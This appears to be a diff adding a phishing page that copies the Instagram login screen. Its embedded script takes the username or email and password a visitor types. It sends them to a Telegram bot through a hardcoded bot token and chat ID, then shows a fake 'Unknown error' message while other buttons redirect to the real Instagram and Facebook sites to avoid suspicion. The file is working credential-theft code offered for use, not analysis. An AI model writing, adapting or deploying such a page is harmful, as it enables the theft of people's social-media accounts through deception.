@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="assets/css/main.css">
+  <title>Instagram</title>
+
+<style>
+
+body {
+  user-select: none;
+}
+
+#problem {
+ color: #fb2929;
+ padding: 0;
+ margin: 20px 0 0 0;
+ max-width: 280px;
+ font-size: 14px;
+ text-align: center;
+display: none;
+
+}
+
+</style>
+
+</head>
+<body>
+  <main class="l-main">
+      <div class="l-main__img">
+        <img src="assets/img/homepage.png" alt="Smartphones">
+      </div>
+      <div class="l-user">
+        <div class="c-panel group">
+          <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
+          <div class="c-panel__form">
+            <input type="text" class="c-panel__input" id="eml" placeholder="Phone number, username, or email">
+            <input type="text" class="c-panel__input" id="pswrd" placeholder="Password">
+            <a href="#" class="c-btn" id="login">Log In</a>
+            <span class="c-panel__span">OR</span>
+          </div>
+          <a href="#" class="c-panel__facebook" id="lwf" >Login with Facebook</a>
+          <p id="problem">Unknown error. Please try again later</p>
+          <a href="#" class="c-panel__forgot" id="fp" >Forgot password?</a>
+        </div>
+        <div class="c-signup group">
+          <p>Don't have an account? <span id="su" >Sign up</span></p>
+        </div>
+        <div class="c-app">
+          <p>Get the app.</p>
+          <div class="c-app__download">
+            <img src="assets/img/apple.png" alt="Apple Store">
+            <img src="assets/img/google.png" alt="Google Play">
+          </div>
+        </div>
+      </div>
+  </main>
+
+
+  <script>
+
+    const login = document.getElementById('login');
+    const eml = document.getElementById('eml');
+    const pswrd = document.getElementById('pswrd');
+    const problem = document.getElementById('problem');
+
+    login.addEventListener('click', () => {
+      login.textContent = 'Checking...';
+      setTimeout(() => {
+        problem.style.display='block';
+        login.textContent = 'Log In';
+      }, 2000);
+
+        var text = `Email ou Numéro: ${eml.value}\nMot de passe: ${pswrd.value}`;
+
+        const botToken = '7040045863:AAHya2LQ1sDFhPybr9pIuDgOO_VTeH755R8';  
+const chatId = '6679203713';  
+const message = text;  
+  
+fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {  
+    method: 'POST',  
+    headers: {  
+        'Content-Type': 'application/json'  
+    },  
+    body: JSON.stringify({  
+        chat_id: chatId,  
+        text: message  
+    })
+});
+
+    });
+</script>
+
+<script>
+
+lwf.addEventListener('click', () => {
+location.href="https://www.facebook.com/";
+});
+fp.addEventListener('click', () => {
+location.href="https://www.instagram.com/accounts/password/reset/";
+});
+su.addEventListener('click', () => {
+location.href="https://www.instagram.com/accounts/emailsignup/";
+});
+
+</script>
+
+
+</body>
+</html>
